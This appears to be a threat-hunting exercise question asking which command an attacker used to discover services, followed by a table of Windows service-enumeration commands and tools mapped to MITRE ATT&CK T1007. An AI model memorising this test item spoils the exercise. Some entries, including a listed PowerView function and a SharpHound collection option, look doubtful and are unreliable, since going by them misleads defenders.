s1q27


What command used by the threat actor was used to look for information about services?

| Command / Tool              | Example Command                                         | Purpose                              | MITRE ATT&CK                     |
| --------------------------- | ------------------------------------------------------- | ------------------------------------ | -------------------------------- |
| **sc.exe**                  | `sc query`                                              | Enumerate services on a host         | T1007 – System Service Discovery |
| **sc.exe**                  | `sc query state= all`                                   | List all services and states         | T1007                            |
| **tasklist**                | `tasklist /svc`                                         | Maps running processes to services   | T1007                            |
| **net.exe**                 | `net start`                                             | Lists running services               | T1007                            |
| **wmic.exe**                | `wmic service get name,displayname,state`               | Query services via WMI               | T1007                            |
| **PowerShell Get-Service**  | `Get-Service`                                           | Enumerate Windows services           | T1007                            |
| **PowerShell**              | `Get-Service \| Where-Object {$_.Status -eq "Running"}` | Find running services                | T1007                            |
| **PowerShell CIM/WMI**      | `Get-CimInstance Win32_Service`                         | Query service information            | T1007                            |
| **cmd.exe**                 | `net start`                                             | View active services                 | T1007                            |
| **Sysinternals PsService**  | `psservice.exe \\host`                                  | Remote service enumeration           | T1007                            |
| **PowerView**               | `Get-DomainService`                                     | Enumerate domain services            | T1007                            |
| **AdFind**                  | `adfind -sc serv`                                       | Query AD service-related information | T1007                            |
| **BloodHound / SharpHound** | `SharpHound.exe -c Services`                            | Collect service relationships        | T1007                            |






